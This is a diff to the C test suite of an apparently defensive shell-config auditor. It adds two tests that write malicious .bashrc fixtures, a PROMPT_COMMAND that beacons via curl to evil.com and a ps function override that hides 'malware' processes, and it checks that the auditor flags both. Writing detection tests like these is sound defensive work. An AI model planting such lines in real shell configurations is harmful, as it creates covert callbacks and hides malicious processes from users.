@@ -398,6 +398,59 @@ static void test_file_kyc_lure(void) {
     else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
 }
 
+static void test_audit_shellrc_prompt_command(void) {
+    char saved[512], rc_path[512];
+    const char *orig;
+
+    setup();
+    snprintf(rc_path, sizeof(rc_path), "%s/.bashrc", tmpdir);
+    {
+        FILE *fp = fopen(rc_path, "w");
+        if (fp) {
+            fputs("export PROMPT_COMMAND='curl http://evil.com/beacon'\n", fp);
+            fclose(fp);
+        }
+    }
+    orig = getenv("HOME");
+    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
+    setenv("HOME", tmpdir, 1);
+    {
+        AuditVerdict v = hlse_audit_shellrc();
+        setenv("HOME", saved, 1);
+        unlink(rc_path); cleanup();
+        TEST("Audit A6: PROMPT_COMMAND injection in .bashrc → flagged");
+        if (v.score >= 35) PASS();
+        else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
+    }
+}
+
+static void test_audit_shellrc_function_override(void) {
+    char saved[512], rc_path[512];
+    const char *orig;
+
+    setup();
+    snprintf(rc_path, sizeof(rc_path), "%s/.bashrc", tmpdir);
+    {
+        FILE *fp = fopen(rc_path, "w");
+        if (fp) {
+            fputs("function ps() { command ps \"$@\" | grep -v malware; }\n",
+                  fp);
+            fclose(fp);
+        }
+    }
+    orig = getenv("HOME");
+    snprintf(saved, sizeof(saved), "%s", orig ? orig : "");
+    setenv("HOME", tmpdir, 1);
+    {
+        AuditVerdict v = hlse_audit_shellrc();
+        setenv("HOME", saved, 1);
+        unlink(rc_path); cleanup();
+        TEST("Audit A6: function ps() override in .bashrc → flagged");
+        if (v.score >= 30) PASS();
+        else { char b[64]; snprintf(b,64,"score=%d",v.score); FAIL(b); }
+    }
+}
+
 static void test_audit_all(void) {
     TEST("Audit: combined audit completes without crash");
     AuditVerdict v = hlse_audit_all();
@@ -508,6 +561,8 @@ int main(void) {
     test_audit_path_clean();
     test_audit_shellrc_backdoor();
     test_audit_shellrc_clean();
+    test_audit_shellrc_prompt_command();
+    test_audit_shellrc_function_override();
     test_audit_perm_aws_creds();
     test_audit_perm_ssh_key();
     test_audit_all();
